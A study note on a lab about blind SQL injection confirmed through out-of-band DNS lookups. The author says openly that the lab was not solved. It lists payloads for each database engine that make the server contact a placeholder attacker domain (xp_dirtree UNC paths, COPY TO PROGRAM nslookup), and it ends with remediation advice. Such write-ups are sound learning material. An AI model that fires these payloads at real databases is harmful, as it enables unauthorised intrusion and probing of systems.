# Blind SQL Injection with Out-of-Band Interaction

**Category:** SQL Injection
**Difficulty:** Practitioner
**Tools required:** Burp Suite **Professional** (Burp Collaborator client is
Pro-only)
**Status:** 📝 Studied via walkthrough — not yet personally executed

*Note: I have not solved this lab myself. These are notes I took while
studying a walkthrough for later revision, since I don't currently have Burp
Suite Pro access needed for Burp Collaborator. I'm documenting the
methodology here to show I understand the technique, not to claim
completion.*

---

## Objective

The application executes the injected SQL query asynchronously — meaning
there's no content difference, error difference, or even a response-time
difference to exploit, unlike the earlier blind SQLi labs. The only way to
confirm the injection is to trigger an out-of-band network interaction (a DNS
lookup) from the database server to an external domain controlled by the
attacker.

## Why This Needs Out-of-Band Techniques

Because the query runs asynchronously, none of the previous blind techniques
(content, error, or time-based) produce any observable signal in the HTTP
response. The only way to confirm exploitation is to make the *database
server itself* reach out over the network to a domain the attacker controls
and monitors — proving code execution happened, independent of anything the
web application returns.

## Methodology (as studied)

1. Generate a unique subdomain via Burp Collaborator (Pro feature) to serve as
   the external domain the injected payload will attempt to contact.
2. Identify the injection point and confirm the database engine, since the
   syntax for triggering a DNS lookup differs significantly by engine:
   - **Oracle:** exploiting via a UTL_HTTP or UTL_INADDR call embedded in an
     `SELECT EXTRACTVALUE(...)`-style XML function to force a DNS resolution
     of the attacker's Collaborator subdomain.
   - **Microsoft SQL Server:** `EXEC master..xp_dirtree
     '//subdomain.attacker.com/x'` triggers a DNS lookup as part of resolving
     a UNC path.
   - **PostgreSQL:** `COPY (SELECT '') TO PROGRAM 'nslookup
     subdomain.attacker.com'` (where extensions permit).
   - **MySQL:** `LOAD_FILE` or DNS-triggering functions depending on
     configuration.
3. Send the crafted payload via Burp Repeater.
4. Poll Burp Collaborator for interactions — a successful DNS lookup entry
   appearing confirms the injection point can reach external systems.

## Why I Haven't Executed This Yet

Burp Collaborator's client is bundled only with Burp Suite Professional.
Community Edition has no built-in way to generate a Collaborator payload or
poll for interactions, so this lab cannot currently be completed hands-on
without Pro access.

## Planned Remediation (if I were the developer)

Disable or tightly restrict database functions capable of making outbound
network calls (UNC path resolution, `xp_dirtree`, `UTL_HTTP`, `COPY ... TO
PROGRAM`, etc.) unless explicitly required, and apply network egress
filtering so the database server cannot resolve or reach arbitrary external
domains in the first place.

## Key Takeaway

This walkthrough taught me that "no visible signal at all" doesn't mean "not
exploitable" — it means the oracle has moved outside the HTTP
request/response cycle entirely. I understand the theory and engine-specific
syntax well enough to execute this once I have Collaborator access, and it's
next on my list once I upgrade tooling.
